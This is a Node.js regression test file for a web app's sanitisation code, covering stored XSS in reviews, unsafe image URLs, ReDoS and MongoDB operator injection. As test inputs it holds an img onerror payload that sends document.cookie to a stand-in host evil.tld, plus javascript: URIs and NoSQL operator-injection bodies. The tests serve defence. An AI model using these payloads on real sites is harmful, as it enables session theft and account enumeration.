// ============================================
// Regression tests — injection guards (H-02, H-06)
// ============================================

require('./helpers/env');

const test = require('node:test');
const assert = require('node:assert/strict');

const { stripHtml, cleanText, escapeRegex, isSafeUrl, cleanImages } =
  require('../src/utils/sanitize');
const sanitizeMongo = require('../src/middleware/sanitizeMongo');

// ─── H-02: stored XSS in review content ──────────

test('stripHtml removes script tags and their contents', () => {
  assert.equal(stripHtml('<script>alert(1)</script>hello'), 'hello');
  assert.equal(stripHtml('<SCRIPT>bad()</SCRIPT>ok'), 'ok');
});

test('stripHtml defuses the img onerror payload', () => {
  // The exact shape that would have executed in an admin's browser while
  // moderating an unapproved review.
  const payload = '<img src=x onerror="fetch(\'https://evil.tld/?c=\'+document.cookie)">';
  const cleaned = stripHtml(payload);
  assert.ok(!cleaned.includes('<'), 'no angle brackets may survive');
  assert.ok(!cleaned.includes('onerror='), 'no event handler may survive');
});

test('stripHtml removes markup but keeps the prose', () => {
  assert.equal(stripHtml('<b>Great</b> product'), 'Great product');
});

test('cleanText caps length so one request cannot store an unbounded document', () => {
  assert.equal(cleanText('a'.repeat(50_000), 2000).length, 2000);
});

test('cleanText passes through non-string input unchanged when nullish', () => {
  assert.equal(cleanText(undefined), undefined);
  assert.equal(cleanText(null), null);
});

// ─── Image URL allowlisting ──────────────────────

test('isSafeUrl rejects javascript: and data: URIs', () => {
  assert.equal(isSafeUrl('javascript:alert(1)'), false);
  assert.equal(isSafeUrl('data:text/html,<script>alert(1)</script>'), false);
  assert.equal(isSafeUrl('vbscript:msgbox'), false);
  assert.equal(isSafeUrl('not a url'), false);
  assert.ok(isSafeUrl('https://res.cloudinary.com/x/image.png'));
});

test('cleanImages drops entries with unsafe urls', () => {
  const out = cleanImages([
    { url: 'https://res.cloudinary.com/ok.png' },
    { url: 'javascript:alert(1)' },
    { url: 'data:text/html,x' },
  ]);
  assert.equal(out.length, 1);
  assert.equal(out[0].url, 'https://res.cloudinary.com/ok.png');
});

test('cleanImages caps how many images can be attached', () => {
  const many = Array.from({ length: 50 }, () => ({ url: 'https://x.com/a.png' }));
  assert.equal(cleanImages(many, 5).length, 5);
});

// ─── H-06: ReDoS via unescaped $regex ────────────

test('escapeRegex neutralises a catastrophically backtracking pattern', () => {
  const escaped = escapeRegex('(a+)+$');
  // Escaped, it matches only the literal text — no nested quantifiers.
  assert.ok(new RegExp(escaped).test('(a+)+$'));
  assert.equal(new RegExp(escaped).test('aaaaaaaaaaaaaaaaaaaaaaaa'), false);
});

test('escapeRegex escapes every regex metacharacter', () => {
  for (const ch of ['.', '*', '+', '?', '^', '$', '{', '}', '(', ')', '|', '[', ']', '\\']) {
    assert.ok(escapeRegex(ch).startsWith('\\'), `${ch} must be escaped`);
  }
});

// ─── H-06: operator injection middleware ─────────

const runMiddleware = (req) => {
  let called = false;
  sanitizeMongo(req, {}, () => { called = true; });
  assert.ok(called, 'next() must be called');
  return req;
};

test('sanitizeMongo strips $-prefixed keys from the body', () => {
  // {"email":{"$ne":null}} was the mass-unsubscribe and enumeration vector.
  const req = runMiddleware({
    method: 'POST', originalUrl: '/x', ip: '1.1.1.1',
    body: { email: { $ne: null } }, query: {},
  });
  assert.deepEqual(req.body, { email: {} });
});

test('sanitizeMongo strips operators from query params', () => {
  const req = runMiddleware({
    method: 'GET', originalUrl: '/x', ip: '1.1.1.1',
    body: {}, query: { status: { $ne: 'cancelled' } },
  });
  assert.deepEqual(req.query, { status: {} });
});

test('sanitizeMongo strips dotted keys (mongoose update-casting pollution)', () => {
  const req = runMiddleware({
    method: 'POST', originalUrl: '/x', ip: '1.1.1.1',
    body: { 'a.b': 1, '__proto__.polluted': true, ok: 2 }, query: {},
  });
  assert.equal(req.body['a.b'], undefined);
  assert.equal(req.body.ok, 2, 'legitimate keys must survive');
});

test('sanitizeMongo recurses into nested objects and arrays', () => {
  const req = runMiddleware({
    method: 'POST', originalUrl: '/x', ip: '1.1.1.1',
    body: { items: [{ qty: { $gt: 0 } }], nested: { deep: { $where: 'x' } } }, query: {},
  });
  assert.deepEqual(req.body.items[0].qty, {});
  assert.deepEqual(req.body.nested.deep, {});
});

test('sanitizeMongo leaves clean payloads untouched', () => {
  const clean = { email: 'a@b.com', quantity: 3, tags: ['x', 'y'] };
  const req = runMiddleware({
    method: 'POST', originalUrl: '/x', ip: '1.1.1.1',
    body: structuredClone(clean), query: {},
  });
  assert.deepEqual(req.body, clean);
});
